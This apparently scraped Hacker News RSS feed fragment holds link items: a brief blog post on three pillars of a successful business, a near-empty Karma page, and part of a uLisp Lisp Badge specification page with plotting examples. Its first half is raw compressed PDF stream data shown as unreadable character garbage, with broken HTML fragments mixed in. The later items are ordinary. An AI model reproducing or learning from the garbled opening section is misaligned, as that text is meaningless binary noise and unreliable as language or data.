"î»æ…ÏR{DÆsÐÔ¡pÙ[Y™C9ÄTZÖ·CÔM¦Ì@O[ø~tâ•;¶&nbsp;àu0ã@6G#…÷ˆoL¸Aï}Xêä{(r=CÒÀ�IK&amp;œ†¾•C¼ØþD¯\³ÙÛ›î¢˜�YQÊ“œP;C m~óPÞ—Ú&lt;=ð»œøn©'~ÓSâk˜g�¹sï'0U¶Z®Z¸?`·l‹¯B’ëJÌV±Ùœù©*@Ö¡ÊE9¸šKDšQkÀ`õHœo™@–ˆ¯&nbsp;.iß%Eÿ›	ë Éª�vú¿2Ö»NXF’¼¬u³Õb§èa˜{z©®xÐx5Žþ&lt;³Þ•…\ÊBäÞš(Sß×š¤î3„è·v«S•Å^‰k@ïn–¡í�~‘¨•·/N ÿÑë2&lt;³&amp;ÙÜù2¦å\S?z¨�&nbsp;Ò($ýÝõÝŸ°×ÀA;Ë­Žoþù2¥&gt;
endstream
endobj
36 0 obj
&lt;&lt;
/Length 2370      
/Filter /FlateDecode
&gt;&gt;
stream
xÚuXYsã6~÷¯Ð#U5æx=n²“Œ·’Lv­ªl*ÉDBË&lt;öxýöJ²9/Ðh�&gt;¿f´9n¢Í�wßíî&gt;þ…ET¨Íî°)Š0Vz“*ZovÕæ�@…q¸½Ï2üº½WÁ¶q|ùî§O??nïµŽƒß¶*Ø}æÉ§ÿ&gt;&lt;î~ù‘g�¿?î�ï¯Ý¿&gt;þ&nbsp;Òë›tjBSd ]¢‘ç.É6°;ã8�AfIÎL¶Ã»_·÷F%A?TnÁÒîé[7Õ­qÉFIdGf«;þŸNŽî«mÏ�cÎþpY%!�º2ÖE˜Å^Æiè‡Õ·Äa¦”g+QÈ“­;C½½¼«ð€Í}œÅ¡Ñjs¯t˜˜‚wnœ›	8Í’Á¿å¿²oÏód§ºï˜P¹óNÁG¦Ô²2Îû‰Þã—-°XÒšpùý,P�8Œƒ=œ˜nB~Úé\GâF·rÒ^­2’Š¤è;à„ÿiÄ…”¤G†§W
XÌè,x S‚FéÊj.ëîÈœ–OèÜËÍyÐƒ›uè�Ž÷òrkÅ'pÓàþžëÁ]Ëœ°È=H2°S®­U0õÌ°gÅò¤íiVÕxóŸ‘6 …«pzK†`LpÔ4L_ökÍ³?‚
›±çÑ‰¤}ÞòùHÁu…«zÞ&amp;‰8ùd�~÷têçã	=='½ñl‡©.çÆP¡5ý*K&nbsp;T8ÿ¹®üÁì³ÚÜøl…q¾øöøÚÝó{üÂ�ÅËÓ°Mh¬þûàJ¤q¨ã%&nbsp;['&amp;ïê±UÆ©×ë„Ò½à"º¬$(òq°íø§hÓ'vXª'þg�
¯<sv” ù0¨[1(¿dºvƒóÅáÜð±ì»qnÙ="" øoú†="" ã4Ìå4ct†Þ£â8ŒÉ‹(™�¸ùßv2çcì›ø@ì÷£À¾i="" 1¬="" ÚÌnËúoûq(“û*#vËÝ?Ée½lèÅÓ{¹k|'‡Êüvè�="" ¥+Ý“="" 89%ÍÉ¦^k¥g^¨g¿âfÑ1’¬°œŽÄšbô(‹r™„ì`&€ŽspÖÒor¿&;¿Ø#0 ëc‡¾Žõ±íhxa‡Á="" É8e?Áÿ%¸qâŸ“Ës€ä�akš(æîÐÓl�²“cbçp55yòëš¨ÕìÄÄ½˜ó$„¦nkº="" '¶ªÒ1™ílka¢ô="" $÷µf…"…ë€ffô~³¯Š,1Çf¹8¨¹8(¦¡÷©ñ�4*a%e¤jv²tc_2o³€*b­Ì%@öâˆÃ“ã�”Éƒ~?a5="" ŸÅ©¤aaè‹ýam="" •3�—f‡‰©œ‡zz]Ç¡ÎrÏmá“Ÿ)±+="" r@e�¤^¨°�cÞÕžÏm]jüÆy†¾Å‘ybžÕ="" ¶i^™="" Œ,¶,!#3ßeu)="" ‡w’idlÜbeÆbÁ™¬œuàÖ²p][ñÀ+aÁ’ÂpéÐy="" eÒ6Þus�*Ñ]:8f°~0:Éº¶h ¬miëÈòÔüÆœ´s.‘ëäÏ!û¼½Ò="" zæŠ…šÎõuˆàagÒh‰5xäõªcsñxðóbrgnpú@ñ4ŠÆ·Œ–i7®j�­§="" m’|…n·Ý·c¿ßwòÕòk¿�-[="" h£="" Ý„¹Ê="" °�…Š¨Åi šx“…ú!i¶Ôaá‘³z�<t—›$daƒ\”&ìkyy…Š”k�vœvqy°dÇ}#Á¤rh±¾i:¤Ò4¾˜—&="" ×¿8ua1="" àúžt39á¢="" €ÿÊn3�*‚z•œxtrfp$€¼öv'û"·_kí±«§¹rk¶å¼l®Ý³8ÿ‘µç¤È="" 6Ó&'w¬é¦ëª¿l<ØzÀ| m� ;j*g*ßî(­@‡son;äp–eqkysoÑšn‚Ý‰ð—Š�n1xãÙž|›Ž�cùˆ="" ‚ÿèþ†›†�="" ÐhË~|ä!Ëkgúˆ#†Á•="fÞ•«ëÛa" „úÚ;®1j�}="" ö2¿¡poäj�™="" oœg!_l¡s©›š(økËz²n®ãfci›·yneh¸ä'd‘Î{w¤¾¨a#ôo8¤+ß¤h^atÃcfßÿôåñË#�'ûd‰yä)å›t’æ›Û�Ó©fï]ú:¯j="ÞCîˆ¸ï!RñÜ7Š“ÇÎð”KÍÈM“ï¤D½Ê«×/³?3}±¢“Un" Ù¹tÖŠd9\]Ô="" lh6="" ªv’Ä˜Üà!&="" Ót]="">bÄð­Âçbe(·pÆ	�¹¤òeŸ‰¸Ç¢×ò&amp;¦ñ"„nŒ�þÄ íÈÒ½ä@óÀUºOé,¥¾J^Ã9y¦Eî‘Ë	„F¤cé·&lt;Õå6�ØAÉ“+ÉÁ
ä¶5lea”.Ž¼Î&nbsp;×
"’õƒË'€Þ¢$ÌRý¦Rƒ“Öxui—–œÛ2öžv¶uÍëêuf:]{"¤¶�¼rå5	è'/üfo¯ˆUK—+jZS�sm.šáGkè ¡©¿©Ú;�{ß\T„*1ßzÊ*454ÚË¨ÅBœÈ2*&amp;K®:µÌ—A"w²eo©=	KïY¨'c$˜l	\#b�øt†tãÍç·O»»¿ïð{V´Qþ“&nbsp;ŠsÒÙ¦lïþø+ÚT°Ù"Ôà¡/ÄÙn”’¢9›ÍãÝ¿ùû¢É6	 €à¨eÐÔ€À,YœÜ`£�ÀvCªe"2É£â¢uªjÏ5tcäö·ý“os#ì›ñ‰�&amp;x°…j	:}Áy¾¤V˜�
Î¥ÀGi?5Érël÷®n7ÍõU¯’Ë9‚àœ™À'7z¾]ç�Œ‰Ò0É1œÀyãåFLÜoJJ5òEÍøŠe¡•Èx‚nÒ¤€—Áç-ÊÏáÏâÉH$9R&gt;žOJ±y–[‘Ë?½¹—vÔB}8é�¿pâ–Þï^¿†öW/üÇÏÿÄÂ_óôž”ùPH%§¬¥Ÿt
œ
4ö3šœI{‚õ¤q˜±Æayá7£—#MJ°-è¬&nbsp;êš˜Å34õ©Š`I$_�^w%~\�K¨á¦ƒÝÚ3š"¼‰¦·ÿ]ÿl€W
endstream
endobj
43 0 obj
&lt;&lt;
/Length 2250      
/Filter /FlateDecode
&gt;&gt;
stream
xÚ�Ù’ã¶ñ}¾B�TÕ
C&lt;ý¶&gt;6ÞT²v¼rÅUŽ+…•0#Öò�	pfå¯w7ºAQc®]É4�¾»Átó¸I7»ûrwÿF™Š:­åfÿ°)SQÅ¦�™¨µÞì�›Ÿ“lûËþï÷oT½DTi!”2å«o_¿ÿæ‡íNk•H±Ý•¥NÞ¾Ûÿ°UeòÝ×?~µûÝ;$s—òÝ//Þ1Á�NE™WDö0ô®9ÚÑ·;U—‰¡ái›ç‰qžVMw‡­ª—Ùn+Ûã”÷‡žÆÿ¤:7~žg­¥¹»8o;Lg:M¾ðè3Ò³Oá;¾±Ò.dü¡ã“fò§at¤žLmJQ—i�F¹�õF‹:¯IEX/„f¼�,Ež²ÐöÓ¹5M·ªªNº!ÈY‚8§íN&amp;MÿèhmFd£¬’~ð&lt;1~MÛ^hyjìhÆ
qjðìTcZTåÉk¢B;v!Ó…a|4}ó›ñ
(øËí¤yÆB�ê‘Ëdp˜ÊP%=Ž0çTò¡AZ¸3Œ`Hš~‡¬GÎžƒÑlO;½é,Z¢ÖUòoà)ˆlý‰Nèˆv…ÃÔ¡¥+´4‚føoÁeÈ,r©pæ?'öÿÑ¸óý÷ãð8šÎÝ«.”úÞùéáaÍZRçBÕYôùWk”¢ÔuÄ˜I‡‹�Oÿš¾¾Ò‡Ô&nbsp;7¥nçO`~ZÚÖÙ`4”Ðª¸µLÛ|Î»Æ£¬EU«x�BžfN�ÇÀìÿÀ$†<j^k™ln"ÿc`ðk„Ã¸do½¡�$�Ì! ªdq"Í9ëìo!ÊtÑý¡…°‹çÃ@ÕàÈÄ�Î–ÜÕ…È®â(_“¢•."^ãˆ¸?q~�y<]w†="">Ì
Îþ:Ùþ`	mx è”êâ­#pdUÁÇü8 Hm”ò,¤ÙÓíOáÖB&amp;­	Áû‘Vág´D!=ð'þøîíO4;7¤tÞè� ÛÒšræx¡¥½¶ÅÜSæ1Nfr|¼¡p³cg��ñv-)@6=£;€^zE�Ž;Mlžšã„Ù×nxðsâ
™
¡‡!$ÌáœÒ™ðÁô×Ê„Ñ�¹–�#�ü€cŠfÃeÌûš­3L~)çJ™¦qÁs!âTV°r³2­›Z�iTfÉ—“§íà2°kZ7Ð¬³¦wñ¬ám$‰#§CÜ|F‚¡¸­ýD‹£ñ†ögƒ»5u	•Žº¦…óC(šZeáF„þq2+6ÝÂÒ¡”&gt;TNŒg(Tk°*\ï´P-“[»×� 2ÈÓÑå:8L9ãæn$=&lt;¬‰õïÃP=çªN^÷H}ôdûX™’&amp;n¢â†F#ˆ!ÔE¤ ´·öèh'0&nbsp;+ó°è¨ªCá
i¾(T~<o(™Á§…j¹[µÔÌ˜9vhkr¼2�&˜f«…Ãâlfn‡¹ rò­b‘&eâñ8Óö»˜km7Œœˆo³äÌ|#%´&¹âš˜a×'9ïj¡„"ÜàëÆù¦?„ò¿Ó”4ä­Æd¤) aç<6�="" Â‚Ø†‰³ÐÂgxgl­$d`bÕ¢”%÷“Ó8Î¥]ÕylÒp‘�ç©á�Ör#˜qÁähÝg?œ="" ƒj‚Œåà”¤ýÎpq="" †€ìr="">t#µ…Vu5Çåj¡’<z2w7*�%«¤Ò :zª’whÀ="" è="" �jo="" 9wÉ8™="" @%w‰â £zµÊ÷äÉ;�õÂrÂ^„;:àà¯•="„ˆ¶W/³�¡usp_¼hö¡È-Ëo!t‘Aû«D" �kyþé�¦×Þ**2d�ó°[m="" r1}zèh×­evÎÝ="" æøªxt¢="ÝÁEéúRç»Ã±Ö‡@…ù€ªÂD�§�»&nbsp;f^sWëkzî" t©ojÒÕ™@Õ="" â›º="" •´ðvªø+q§ ãÊŠÿkóïŒÁ�ùºî%¼ìê2?os`~_±½_3av‹"«&(àyö="">4ÈP5DésÓ¶#Ç§h5gny0‚†%#vš…(du	Ü•^x¼UëlMƒ`Mo¡ÐJK/¦æ-++N¡2QþDàa˜Îø4	jq¢5+ëÛ¢=lû‡J2-æ§Ó@€`…Æò™Ãh��³ý¬!2C|B`Z\M˜­àI8uD#¤VÜŸ9…–�AÄ`|©â€eÅvàù¹®Íç
#5|¥¡€_3þ;²EŒ¤ÙòÏù\­D–æÑ‰Ð;V<m¥bÊùÆm÷6ˆ.Ì©†Ãuìr0»mx´aøÀsx0Ž÷pa8Þúyi~fgßÇu"gíða Ðß‹g·_3qårñ¦y{÷(müg%Ö2jŒ}ÈhŸšar1éÏØu›¶b|âñ#œe‘ä–y="" bfƒÊÕ‹—v?kÿúzct\ðv’¥Õ‘i¶û.f‘,c+æh="" �ÌfÑßdÉþ="" �y)£‘3="" $tü®àwuqÍ³�v\}á,k¸¼f@˜‡tŽ#w_ zm}€="">ÌÄf*ç&amp;4—±VËS¡�É›m¥ÂÓáö“Á‡Að‘âŠþÏ©ýLçrGšq×„óJú‘€†÷˜µ°·øSún‡ÈN³ð`ød�;×üf	ºLqƒo\\ÄÏSþè8ûÔPöÇç¼ +@ç®�£q5c!~x¼áÖ#ê(ËRjn2Y/èBêm#ÉÐçàöÃö!ki'^KéøB@l¯—…ò›ýÝ¯wNéFÆ_§Ðiä›Cw÷ó/éæ ©ÐuµyhÝFf¥¨ü÷ÐnÞßý‹~Âfå”²,0H+-ô¦ªD•U7ÿ3€âÑ,TI!s(=¢JëX–ãÏžj�†�V5ÿè8yþâþþùùY¸S3~¼ˆ*®»w?ô~h‡ÇË‡'Vuˆ“ïÚ©_Ž&nbsp;…ßâÊ‚
endstream
endobj
47 0 obj
&lt;&lt;
/Length 2340      
/Filter /FlateDecode
&gt;&gt;
stream
xÚ…XÉ’äÆ
½÷WðÈŽ˜¢¸³x´&amp;fävØš±»’CÒ!›du1šK‰INOûë�€K�hûPÅL $–dúÎ³ã;?Ü}ºûîc˜;�ïå~8§³“ç^DNÄ^EÎ©t~q/ôîY¹Ÿï�û�ûðè~úþ¯þöxˆ¢Ðýéá&gt;pO–Î‡ŸO?þ ½Ç=ž0î·Ó_¾û¤Û�¢4öâ&lt;#Ax“cî|•Ì9ÌìCä{Yr”AmÕöÃ-�ù®I´ûtfÜNs×\¯´©3Ö}gIú$ÉÜ?YÚ—&amp;Vq»g¡Ù7;V­(«¡þ‚µ«Rç¡o¥õÏ~ž7äE�›d&gt;‘—Ä¹ÈY˜¶‚÷µ.!JE²h\‡Ê”ï„7^*[‰žÆªÀ~—®þ}ª¬Ð^Y‚AG4fx®š7™yî‡ç~«ÎÍF‰^ž$!4KÂD¹wŒƒÕ|1í„‰ûñ&gt;�Ý©ip„Ä5e9TÖìÕ•’HÐÈ‹ßŽåhý0÷’0”õªÇé"9Šb³U±&nbsp;-ŠåÎ$Ç”žQ*túNš×¡ŒÏÜ×¡Æ!…Uë·é±Äë¡™õú–¯åšîy2Ï•Ý3ËfûP·§©ïåc&nbsp;i4Ö]©c{ùŽ3Î­êMZö?Ù^× ÕY]v\f*óÌzGëW?ñ¿ÔÃ8™†š�Î-ÙS†e±
ë?�ÌË3_'ñ‚Ü‰ÈÞz®hÏJw2/ñ5€ª¯Eu¥ƒDI¨GŠ’h£ôŒ°ÕÒéÌ8
¦aÿ£!Ü¤“v×ëzóáAäCƒXô–†&gt;¡+Ôþ|³•êbk²DäUÕ �ÉÿË^‚ÏJWD&nbsp;·Ët3.PçzáŽ%\h„²
M6–��¹EmFŽ|!;7†Ö£7†žŸ(8~^&lt;6Nq"4'B§©_8–¥'Ç@‹ÂX—ÚŽý b¡O a·ŽAª&nbsp;x0Š¾½Nc5èvSîùyGçˆ‚TOwhMGÑ’ÉÔ
Â�ºz9{9Hd6Æ› úd"&nbsp;Ë‚3qF]LÐ‰k˜bm!š™7;uIwDçÔˆC
š8Úñ°á?ø.ÖåŽø
)-†Ò¬Õ95ûí1r�1©/‡¨dŽkJÚ	Sê… ‹8[©çÞ^´&gt;+èoðÅ'9"šSJ¢GEÙ‹oÎÖ[MG,˜n×?âœŒ3qì‹ïLÒ E»Æ7Êa't)ŠÈûI¹¶Ÿ†yôÍ4JS´;ãT=ª€A{jæIÅqš1VceNÃÀŠá°Üc]L”Ö�xÞ£,‡Z°îSÝqî¢*‡†ù¨…ZÍßù‚ûÂ^¼÷žPO—™&nbsp;£æ9{©Bk„¢þÕ�âb‘%s›j ¢µ+Ìd©kkB3™ÀY´I:š eÕŠ�ãnLÌRF¶½eUxHÝˆ‡Pw4/³_Ñ0SîV_î�B3¬Ž�’:‡Kä�ÉÑ:UU¢¦ar¯Ã®cÝÖÿÖINhÌª`qÃcºŒ— ¥FY�CÝ.±¿Ý²¤HÓ,:ÿ_vN-¸Ü´øÚ1t9¼®åÂÄ‡?`¹ùÔŒàä}£k]B”Þ¼��
IG�÷²Ì¶îä€ô%ð±ã0£î5&lt;ÁNõ8˜aJ3Â?�4´+µçßNcÔÀd÷¹ÝŒÐš\ïÉè«FÉ‰“¾õLÐ•Ÿ&nbsp;ö|Û	8Ž1&nbsp;P7ÃêÐ7Í’ê@1âÇ¤÷]|9]0æ9ã]˜sP¢»=h›�.§hb/æÐù™2�2
)ÀˆÈê§ïUê¡¥Ä[ü+ÏeKä…Vœªå‚ö4QpEìuÔ;ó"PÉnÞé×‚a&nbsp;i‰—+Í4E&amp;.d’œãßê+™©ã‚z\¶iå0mpšXÛÂ*—4‘äRõäš%ž¤sì¢V»äWÊUý
5ƒ$¨�3À?¶Q¯‘iGÃ¼ìÔ‘YJw„›:2Þ«#3/q
[‡¡|}½ÔK´Ò&gt;3®4ª)&nbsp;˜Ó}KIA53Ý‚T%<r'6-Êdd~¹�ÓvcÃ 9c="" ÉÒ[µlü€vë¡mÕäjháf…ÔøÛ¨0& Ò·“öfö?(›–™†aÍ�z="" ¤ê+Á—^†¨{¦Ècbx·œ\ƒÁ¥¥ÊÍ‘éêdjéÀƒÏÒ‰jnðÌ<£ðÚm™„¬Çíh«‹÷2Þö|a%j¡Õmu»{&jébvÕív?œc·buœ¼‚y¡lk9�®k(j="˜Í&nbsp;c¥cžlßPMÄ×Œ,Ôº">C)d–°ÊŸÁß–û¸ã§¡û&nbsp;›.7j—ý,‰´s½Éfâëxª&amp;¥ûW
)
ø'obÂ×…Ø½,�){º^ûn–°ò�ÊÝšÁb¾Ó¤K0[×Õ™ð&lt;®Rqµ™µ÷Ü0Ûð�ÔªR¼QÚgc©Ø*àÉg-ÎS�4J]@ë®õ8±h$¢Ãã ¢ñ9ÞxÅ;l¡g,«¦âØuP#÷8JÑÈ}Ò’éì™3!Q©Ž§Šª^ou¨/Ïpx-Ê"Õz$•ú„Ž²¥Ôæw—\�It5¼tÆÙk‚™hìÞ¥TŠpÔüÌ¤E9‰òèš2äþÉÄ­@ËýUÓø¿$[¾7Äa�î¦î5eùé¬|Í¤®‘Q`
TjKº{6£.¤oN&lt;ÛÐEX¨sù.±:èFx¹xSJq¸y¨ûpºûý.&nbsp;¦ïóãad^�¢½ûå7ß)‰GgóKœWÙ:ALy(M©Ý8�w——È8sÊN„ã”v‚ ðÒ˜2¥¢ŒFn:âÈ9bzŒ�±$HOG_]êü†.t„q¸òŽ\|µìc10£9ŸíE¹Çó£®—¨)òÍ!nŠo–WªZéSècD‡‡'^�§ÅtãMçm•J4È&nbsp;/w7g&gt;ÈY2üoòÿ&gt;ïçÕxxxãQkÍq/•DþMþÛ¼ZÄ¸òbAn`ã‹~~¸Ð©*r÷©æ(š”×‰i°@â,�ÜOØŒuÂûIÒR/9Fôõ×ÚbŠj4Nô=jîD›ªVÒee®jG+£ckéå!ç‚Š˜êé2ÄèŒW–´i¼×þöK®þ‡ú 
endstream
endobj
50 0 obj
&lt;&lt;
/Length 2216      
/Filter /FlateDecode
&gt;&gt;
stream
xÚ•XÉ’ã6½×WðHE”X\Eræä¥ÛÓsðÒ–O¶£"¡¢HBÉ–Ë_ïÜ@QÕòDÌ‰ÈD"äò2Á8xâà»‡¯÷Oï“]�ÄQ×I°?eU»]°Kò¨Î²`ß¿†»Íïûÿ&gt;½Oëµ`ï¢45$òÍ¾úqÿîãf›ei˜D›mYfá‡ï÷7iþðí/ßì?üð=ªyˆeï·oEá6‹£²¨Xm£ÇÑ:
zÓ"Tmë€�Ä.ÏªÑ°QžÕáGÝèwšº×M•…�,rÜl“Ðn’Ð1m†qRC£eZ±ÖI7¸ô4˜?fÙ¨Q]§[¾u–¯O™Åe”�]äÚx¢M‘„|ª¼GÜòŒ,ÕÐ*Á;ñ²m’EE^óâN½Úy‚ue’5´¶7©ÉØ�7ÏÓ&nbsp;Œê2¦½“,“WAÕ…¨(XìÖ’UTì*Øó*vRx¼"
áþn‚›‘„‡Í6­Bm†gžœGžIÃÉ²ÄÙéÏh4nN2yÒ&lt;8;®éEuvV3^dÓÁeã:Êàl7·&gt;&nbsp;ªWX³+Â#ÉwSâÞ-yVX
Fx¹ÈÓpî[�«±ÃhÆidÊùûl&gt;óípÑi¥{·úVçñÔ1·àÓöÊèÙoûìTÏxŠ´¾¬�98åŒ=_M&lt;2ò+Ë\k~‹³L»«u�ùÙ¸iV�lÃñ4ÄHžÖçôf�LOn)½JbòÿÈ\ý§nfˆ4jR�Qé€0qAÝ

»äÐ.£$�É^u¦1ve-gÖ„›¹—Üã©F
¼d°¢ØiÈÊ;G¶(XVr`\ó»,9�éô4;/)¼í¬Ñ5IøÌòt</r'6-êdd~¹�óvcã></m¥bêùæm÷6ˆ.ì©†ãuìr0»mx´aøàsx0ž÷pa8þúyi~fgßçu"gíða></z2w7*�%«¤ò></o(™á§…j¹[µôì˜9vhkr¼2�&˜f«…ãâlfn‡¹></j^k™ln"ÿc`ðk„ã¸do½¡�$�ì!></sv”></puàî)•î0à†ß]tâgø"�ûá÷‡mÿrõš›(ðìéqv\@+uk6*ñêû�àêî�àxÿùùà½¨d‡èj></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://metamodular.com/closos.pdf">http://metamodular.com/closos.pdf</a></em></p>]]>
            </description>
            <link>http://metamodular.com/closos.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-23730107</guid>
            <pubDate>Sat, 04 Jul 2020 04:24:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3 Pillars to Building a Successful Business]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23729998">thread link</a>) | @grwthckrmstr
<br/>
July 3, 2020 | https://www.preetamnath.com/blog/pillars-building-a-successful-business | <a href="https://web.archive.org/web/*/https://www.preetamnath.com/blog/pillars-building-a-successful-business">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>People tend to read scores and scores of articles in pursuit of “how to build a successful business”. </p><p>At the high level, I think it’s really simple.</p><p>Building a successful business is based on 3 strong foundational pillars.</p><h2>Pillar 1</h2><p><strong>Solve a real problem for a large enough group of people</strong></p><p>You can find a real problem by observing people’s behaviour. Do they say “I wish I could do X” or do they actively invest time, effort, and hacks to be able to do X. The latter means there’s a real problem to be solved.</p><p>The next step is to be sure you aren’t solving a problem faced by 1, or just 10 people in the world. You want the universe of people who need the same problem solved to be big enough to satisfy your aspirations and build a real business.</p><h2>Pillar 2</h2><p><strong>Find a way to get your solution in front of those people</strong></p><p>Once you have a real problem that needs to be solved, figure out how to distribute it before you start writing a single line of code. </p><p>Solving a real problem isn’t enough. </p><p>If you have a brilliant pill that takes away headaches, but nobody knows about it, you don’t have a business. </p><p>You need to find a way to distribute the solution to the right audience. </p><p>This could be through blogging, direct email, joining forums and Facebook groups where your audience gathers, ranking for a search term on Google, sponsoring a newsletter sent out to your target customers.</p><p>Don’t know where your customers gather? Just ask a few of them what they did when they faced the problem (did they search on Google?). Or ask them what publications or groups or other internet properties they visit regularly.</p><h2>Pillar 3</h2><p><strong>Hustle</strong></p><p>No rocket science here. A real problem and a means to distribution are great, but you got to be in for the grind. </p><p>Try and understand what the hustle means to you. To me, it gives my life meaning. I love to hustle and find ways to move forward with my business. I never feel like it’s a chore. This is a mindset, you can adopt it too. </p><p>It is easier to adopt this mindset if you enjoy the problem you’re solving the things you have to do to distribute the solution, and if you like the customers you are serving.</p><p>Everything else, like good UI/UX, customer support, brand, logo, etc. can be figured out. But those are built on top of a foundation that is the 3 pillars.</p><figure id="w-node-2f4b74473414-2f0d8df6"><p><img src="https://uploads-ssl.webflow.com/5e085291ed2a2769a872e587/5edce7dab088801155f6fa86_3%20pillars%20article%20image.png" alt=""></p></figure></div><div><h3>✉️ Enjoyed reading?</h3><p>Join Sunday Coffee ☕️, my weekly newsletter that goes out on Sundays (surprise!). </p><p>I'll send links to my posts for the week, and interesting links that I gather from the internet about living a good life, and building SaaS businesses.</p></div><p>In case the subscribe form isn't loading on your device, you can subscribe directly on <a href="https://tinyletter.com/hipreetam93" target="_blank">Tiny Newsletter</a>.</p></div>]]>
            </description>
            <link>https://www.preetamnath.com/blog/pillars-building-a-successful-business</link>
            <guid isPermaLink="false">hacker-news-small-sites-23729998</guid>
            <pubDate>Sat, 04 Jul 2020 03:59:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: How to Take Smart Notes on Karma]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23729972">thread link</a>) | @eveFromKarmaFm
<br/>
July 3, 2020 | https://www.karma.fm/p/TlQNNgt/how-to-take-smart-notes-on-karma | <a href="https://web.archive.org/web/*/https://www.karma.fm/p/TlQNNgt/how-to-take-smart-notes-on-karma">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="user-switcher">
        <p>Search for a user to view their sidebar.</p>
        
    </div></div>]]>
            </description>
            <link>https://www.karma.fm/p/TlQNNgt/how-to-take-smart-notes-on-karma</link>
            <guid isPermaLink="false">hacker-news-small-sites-23729972</guid>
            <pubDate>Sat, 04 Jul 2020 03:54:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lisp Badge: A single-board computer that you can program in uLisp]]>
            </title>
            <description>
<![CDATA[
Score 159 | Comments 24 (<a href="https://news.ycombinator.com/item?id=23729970">thread link</a>) | @lnyan
<br/>
July 3, 2020 | http://www.ulisp.com/show?2L0C | <a href="https://web.archive.org/web/*/http://www.ulisp.com/show?2L0C">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

<p>The Lisp Badge is a self-contained computer with its own display and keyboard, based on an ATmega1284, that you can program in uLisp:</p>
<p><img src="http://www.ulisp.com/pictures/3j/lispbadgehand.jpg" alt="LispBadgeHand.jpg" width="720" height="462"></p>
<p>You can use it to run programs that interface to components such as LEDs and push-buttons via the I/O pins, read the analogue inputs, and operate external devices via the I2C and SPI interfaces. It has a greyscale OLED display that gives 8 lines of 42 characters, and an integrated 45-key keyboard optimised for Lisp.</p>
<p>For details of how to build one see&nbsp;<a href="http://www.technoblogy.com/show?2AEE" target="_blank">Lisp Badge</a>&nbsp;on Technoblogy.</p>
<h3><span>Specification</span></h3>
<p><strong>Size:</strong> 107mm x 61mm (4.2" x 2.4").</p>
<p><strong>Display</strong>: 42 characters x 8 lines.</p>
<p><strong>Keyboard:</strong>&nbsp;Integrated 45-key keyboard providing upper and lower-case characters, digits, and the symbols required by uLisp.</p>
<p><strong>Memory available</strong>: 2816 Lisp cells (11264 bytes).</p>
<p><strong>EEPROM</strong>: 1024 Lisp cells (4096 bytes), allows you to save the Lisp workspace using <strong>save-image</strong>.</p>
<p><strong>Processor:</strong> ATmega1284P</p>
<p><strong>Clock speed:</strong> 16 MHz.</p>
<p><strong>Current consumption:</strong> Approx. 20 mA.</p>
<h4><strong>Language</strong></h4>
<p>uLisp, a subset of Common Lisp, with 122 Lisp functions and special forms. For a full definition see <a href="http://www.ulisp.com/show?3L" target="_blank">uLisp Language Reference</a>.</p>
<p>The language includes two extensions, <strong>plot</strong> and <strong>plot3d</strong>, for plotting graphs and 3d functions.&nbsp;</p>
<p><strong>Types supported</strong>: list, symbol, integer, character, string, and stream.</p>
<p>An integer is a sequence of digits, optionally prefixed with "+" or "-". Integers can be between -32768 and 32767. You can enter numbers in hexadecimal, octal, or binary with the notations #x2A, #o52, or #b101010, all of which represent 42.</p>
<p>User-defined symbol names can have arbitrary names. Any sequence that isn't an integer can be used as a symbol; so, for example, 12a is a valid symbol.</p>
<p>There is one namespace for functions and variables; in other words, you cannot use the same name for a function and a variable.</p>
<p>Includes a mark and sweep garbage collector. Garbage collection takes 5 msec.</p>
<h4><strong>Interfaces</strong></h4>
<p>These interfaces are brought to headers at the edge of the Lisp Badge board. The numbers in brackets refer to Arduino pin numbers:</p>
<ul>
<li>Four analogue input pins using <strong>analogread</strong>: A0 to A3 (24 to 27) plus VCC and GND.</li>
<li>Two analogue outputs using <strong>analogwrite</strong>:&nbsp;MISO (6), and SCK (7).</li>
<li>Digital input and output using <strong>pinmode</strong>, <strong>digitalread</strong>, and <strong>digitalwrite</strong>:&nbsp;MOSI (5), MISO (6), SCK (7),&nbsp;RX0 (8), TX0 (9), SCL (16), SDA (17), and A0 to A3 (24 to 27)</li>
<li>I2C interface using <strong>with-i2c</strong> and <strong>restart-i2c</strong>: SCL (16) and SDA (17).</li>
<li>SPI interface using <strong>with-spi</strong>: MOSI (5), MISO (6), and SCK (7).</li>
<li>Serial interface (FTDI) using&nbsp;<strong>with-serial</strong>: RX0 (8) and TX0 (9).</li>
</ul>
<p>The shift key can be used as a digital input: SHIFT (23).</p>
<p>SCK (7) is connected to an LED on the front panel. This is an analogue output pin, so you can vary the brightness of the LED.</p>
<h3>Plotting extensions</h3>
<p>The Lisp Badge contains two plotting extensions, plot and plot3d, designed to allow plotting to the greyscale graphics display.</p>
<p><span>After generating a plot both functions wait for the ESC key to be pressed before displaying the uLisp prompt.</span></p>
<h3 id="plot">plot&nbsp;<span>function</span></h3>
<p><strong>Syntax:</strong>&nbsp;<code>(plot [<em>x-intercept y-intercept</em>] [<em>function</em>]...)</code></p>
<p>Plots up to four functions on the same graph, optionally with axes.</p>
<p>Each function should be a function of one parameter, the x coordinate, and it will be called with each value of x from 0 to 255. The function should return the y value, from 0 to 63.</p>
<p>If&nbsp;<em>x-intercept</em>&nbsp;and&nbsp;<em>y-intercept</em>&nbsp;are specified,&nbsp;<strong>plot3d</strong>&nbsp;draws axes through those intercepts.</p>
<p>For example, defining:</p>
<pre>(defun sine ()
  (let ((x 0) (y 2045))
    (lambda (n) 
      n
      (incf x (/ (* y 16) 163))
      (decf y (/ (* x 16) 163))
    (+ 32 (ash x -6)))))</pre>
<p>the following command:</p>
<pre>(plot 0 32 (sine))</pre>
<p>will plot:</p>
<p><img src="http://www.ulisp.com/pictures/3j/lispsine.jpg" alt="LispSine.jpg" width="600" height="211"></p>
<h4 id="plot3d">Plotting multiple functions</h4>
